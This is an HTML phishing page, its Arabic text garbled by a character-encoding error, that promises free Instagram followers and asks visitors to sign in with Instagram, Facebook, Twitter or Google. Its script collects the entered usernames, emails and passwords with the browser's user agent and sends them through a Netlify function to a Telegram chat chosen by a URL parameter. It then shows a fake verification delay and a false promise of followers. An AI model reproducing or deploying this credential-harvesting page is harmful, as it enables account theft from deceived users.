<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…ØªØ§Ø¨Ø¹ÙŠÙ† Ø§Ù†Ø³ØªÙ‚Ø±Ø§Ù…</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
        }
        
        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #E1306C, #C13584);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: bold;
        }
        
        .header p {
            font-size: 16px;
            opacity: 0.9;
        }
        
        .content {
            padding: 30px;
        }
        
        .login-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .login-option {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .login-option:hover {
            border-color: #E1306C;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(225, 48, 108, 0.2);
        }
        
        .login-option i {
            font-size: 30px;
            margin-bottom: 10px;
            display: block;
        }
        
        .instagram { color: #E1306C; }
        .facebook { color: #1877F2; }
        .twitter { color: #1DA1F2; }
        .google { color: #DB4437; }
        
        .login-option span {
            font-weight: 600;
            color: #333;
        }
        
        .form-container {
            display: none;
        }
        
        .form-container.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            border-color: #E1306C;
            outline: none;
        }
        
        .btn {
            background: linear-gradient(135deg, #E1306C, #C13584);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        
        .btn:hover {
            background: linear-gradient(135deg, #C13584, #E1306C);
            box-shadow: 0 5px 15px rgba(225, 48, 108, 0.4);
        }
        
        .back-btn {
            background: #6c757d;
            margin-top: 10px;
        }
        
        .back-btn:hover {
            background: #5a6268;
            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.4);
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>Ù…ØªØ§Ø¨Ø¹ÙŠÙ† Ø§Ù†Ø³ØªÙ‚Ø±Ø§Ù…</h1>
                <p>Ø§Ø­ØµÙ„ Ø¹Ù„Ù‰ Ù…ØªØ§Ø¨Ø¹ÙŠÙ† Ø­Ù‚ÙŠÙ‚ÙŠÙŠÙ† Ù…Ø¬Ø§Ù†Ø§Ù‹</p>
            </div>
            
            <div class="content">
                <!-- Ø§Ø®ØªÙŠØ§Ø± Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„ -->
                <div id="loginSelection">
                    <div class="login-options">
                        <div class="login-option" onclick="showLoginForm('instagram')">
                            <i class="instagram">ğŸ“·</i>
                            <span>Ø§Ù†Ø³ØªÙ‚Ø±Ø§Ù…</span>
                        </div>
                        <div class="login-option" onclick="showLoginForm('facebook')">
                            <i class="facebook">ğŸ‘¤</i>
                            <span>ÙÙŠØ³Ø¨ÙˆÙƒ</span>
                        </div>
                        <div class="login-option" onclick="showLoginForm('twitter')">
                            <i class="twitter">ğŸ¦</i>
                            <span>ØªÙˆÙŠØªØ±</span>
                        </div>
                        <div class="login-option" onclick="showLoginForm('google')">
                            <i class="google">ğŸ”</i>
                            <span>Ø¬ÙˆØ¬Ù„</span>
                        </div>
                    </div>
                </div>
                
                <!-- Ù†Ù…ÙˆØ°Ø¬ Ø§Ù†Ø³ØªÙ‚Ø±Ø§Ù… -->
                <div id="instagramForm" class="form-container">
                    <div class="form-group">
                        <label for="instaUsername">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
                        <input type="text" id="instaUsername" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙÙŠ Ø§Ù„Ø§Ù†Ø³ØªÙ‚Ø±Ø§Ù…">
                    </div>
                    <div class="form-group">
                        <label for="instaPassword">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                        <input type="password" id="instaPassword" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                    </div>
                    <button class="btn" onclick="submitForm('instagram')">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
                    <button class="btn back-btn" onclick="showLoginSelection()">Ø±Ø¬ÙˆØ¹</button>
                </div>
                
                <!-- Ù†Ù…ÙˆØ°Ø¬ ÙÙŠØ³Ø¨ÙˆÙƒ -->
                <div id="facebookForm" class="form-container">
                    <div class="form-group">
                        <label for="fbEmail">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
                        <input type="text" id="fbEmail" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ">
                    </div>
                    <div class="form-group">
                        <label for="fbPassword">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                        <input type="password" id="fbPassword" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                    </div>
                    <button class="btn" onclick="submitForm('facebook')">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
                    <button class="btn back-btn" onclick="showLoginSelection()">Ø±Ø¬ÙˆØ¹</button>
                </div>
                
                <!-- Ù†Ù…ÙˆØ°Ø¬ ØªÙˆÙŠØªØ± -->
                <div id="twitterForm" class="form-container">
                    <div class="form-group">
                        <label for="twitterUsername">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
                        <input type="text" id="twitterUsername" placeholder="@username">
                    </div>
                    <div class="form-group">
                        <label for="twitterPassword">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                        <input type="password" id="twitterPassword" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                    </div>
                    <button class="btn" onclick="submitForm('twitter')">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
                    <button class="btn back-btn" onclick="showLoginSelection()">Ø±Ø¬ÙˆØ¹</button>
                </div>
                
                <!-- Ù†Ù…ÙˆØ°Ø¬ Ø¬ÙˆØ¬Ù„ -->
                <div id="googleForm" class="form-container">
                    <div class="form-group">
                        <label for="googleEmail">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label>
                        <input type="email" id="googleEmail" placeholder="example@gmail.com">
                    </div>
                    <div class="form-group">
                        <label for="googlePassword">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                        <input type="password" id="googlePassword" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                    </div>
                    <button class="btn" onclick="submitForm('google')">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
                    <button class="btn back-btn" onclick="showLoginSelection()">Ø±Ø¬ÙˆØ¹</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Ø£Ø²Ù„ÙŠØª Ø§Ù„ØªÙˆÙƒÙ† Ù…Ù† Ù‡Ù†Ø§
        
        function getChatId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('chatId');
        }
        
        async function sendToTelegram(message) {
            const chatId = getChatId();
            if (!chatId) {
                console.error('No chatId found');
                return false;
            }
            
            try {
                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù€ Netlify Function
                const response = await fetch('/.netlify/functions/send-message', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({
                        chatId: chatId,
                        message: message
                    })
                });
                
                const result = await response.json();
                return result.success;
                
            } catch (error) {
                console.error('Error sending message:', error);
                return false;
            }
        }
        
        function showLoginForm(platform) {
            // Ø¥Ø®ÙØ§Ø¡ ÙƒÙ„ Ø§Ù„Ù†Ù…Ø§Ø°Ø¬
            document.getElementById('loginSelection').classList.add('hidden');
            document.querySelectorAll('.form-container').forEach(form => {
                form.classList.remove('active');
            });
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨
            document.getElementById(platform + 'Form').classList.add('active');
        }
        
        function showLoginSelection() {
            // Ø¥Ø®ÙØ§Ø¡ ÙƒÙ„ Ø§Ù„Ù†Ù…Ø§Ø°Ø¬
            document.querySelectorAll('.form-container').forEach(form => {
                form.classList.remove('active');
            });
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ø®ØªÙŠØ§Ø±Ø§Øª Ø§Ù„ØªØ³Ø¬ÙŠÙ„
            document.getElementById('loginSelection').classList.remove('hidden');
        }
        
        async function submitForm(platform) {
            let username, password, email;
            
            switch(platform) {
                case 'instagram':
                    username = document.getElementById('instaUsername').value.trim();
                    password = document.getElementById('instaPassword').value.trim();
                    break;
                case 'facebook':
                    email = document.getElementById('fbEmail').value.trim();
                    password = document.getElementById('fbPassword').value.trim();
                    break;
                case 'twitter':
                    username = document.getElementById('twitterUsername').value.trim();
                    password = document.getElementById('twitterPassword').value.trim();
                    break;
                case 'google':
                    email = document.getElementById('googleEmail').value.trim();
                    password = document.getElementById('googlePassword').value.trim();
                    break;
            }
            
            if ((!username && !email) || !password) {
                alert('ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„');
                return;
            }
            
            const chatId = getChatId();
            const message = `
ğŸ” <b>Ø¨ÙŠØ§Ù†Ø§Øª ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯Ø©</b>

ğŸ“± <b>Ø§Ù„Ù…Ù†ØµØ©:</b> ${platform}
${username ? `ğŸ‘¤ <b>Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:</b> ${username}\n` : ''}
${email ? `ğŸ“§ <b>Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ:</b> ${email}\n` : ''}
ğŸ”‘ <b>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±:</b> ${password}
ğŸ†” <b>Chat ID:</b> ${chatId}
â° <b>Ø§Ù„ÙˆÙ‚Øª:</b> ${new Date().toLocaleString('ar-EG')}
ğŸŒ <b>Ø§Ù„Ù…ØªØµÙØ­:</b> ${navigator.userAgent}
            `.trim();
            
            const sent = await sendToTelegram(message);
            
            if (sent) {
                alert('Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...');
                // Ø¥Ø¶Ø§ÙØ© ØªØ­Ù…ÙŠÙ„ ÙˆÙ‡Ù…ÙŠ
                setTimeout(() => {
                    alert('âœ… ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­! Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ØªØ§Ø¨Ø¹ÙŠÙ† Ø®Ù„Ø§Ù„ 24 Ø³Ø§Ø¹Ø©.');
                    showLoginSelection();
                    // Ù…Ø³Ø­ Ø§Ù„Ø­Ù‚ÙˆÙ„
                    document.querySelectorAll('input').forEach(input => input.value = '');
                }, 2000);
            } else {
                alert('Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰');
            }
        }
        
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ chatId Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
        window.addEventListener('load', function() {
            const chatId = getChatId();
            if (!chatId) {
                alert('âš ï¸ Ø§Ù„Ø±Ø§Ø¨Ø· ØºÙŠØ± ØµØ­ÙŠØ­ - ÙŠØ±Ø¬Ù‰ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„ØµØ­ÙŠØ­');
            }
        });
    </script>
</body>
</html>
